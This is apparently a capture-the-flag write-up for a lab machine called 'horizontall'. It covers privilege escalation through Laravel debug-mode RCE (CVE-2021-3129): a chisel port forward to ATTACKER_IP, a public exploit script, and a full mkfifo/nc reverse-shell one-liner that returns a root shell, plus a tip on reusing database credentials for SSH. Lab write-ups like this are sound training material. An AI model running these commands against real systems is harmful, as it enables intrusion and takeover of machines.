Phase 3

Privilege Escalation — Laravel Debug Mode RCE (CVE-2021-3129)

Internal Service Discovery

strapi@horizontall:~$ ss -tlnp
LISTEN  127.0.0.1:1337  ← Strapi (internal)
LISTEN  127.0.0.1:8000  ← Unknown
LISTEN  127.0.0.1:3306  ← MySQL

Port 8000 runs Laravel v8 with PHP 7.4.18 in debug mode. Forward it with chisel:

# Attacker
$ chisel server -p 8443 --reverse

# Target
$ ./chisel client ATTACKER_IP:8443 R:8000:127.0.0.1:8000

# Verify debug mode
$ curl -s http://127.0.0.1:8000/_ignition/health-check

Exploitation with CVE-2021-3129

$ git clone https://github.com/nth347/CVE-2021-3129_exploit
$ cd CVE-2021-3129_exploit

# Test command execution

# Get reverse shell
$ ./exploit.py http://127.0.0.1:8000 Monolog/RCE1 \
    'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP 6666 >/tmp/f'

# Catch root shell
$ nc -lvnp 6666
root@horizontall:~#
Appendix

Key Takeaways

Internal port enumeration is mandatory.

Laravel on localhost:8000 was invisible from outside. ss -tlnp after every shell — always.

Chisel is essential for internal service access.

Server: chisel server -p PORT --reverse. Client: chisel client IP:PORT R:LOCAL:127.0.0.1:REMOTE. Memorize this.

Laravel debug mode = RCE.

CVE-2021-3129 via Ignition is a classic. If you see the orange Ignition error page, it's exploitable.

Database credentials often work for SSH.

Password reuse between application databases and system accounts is extremely common.
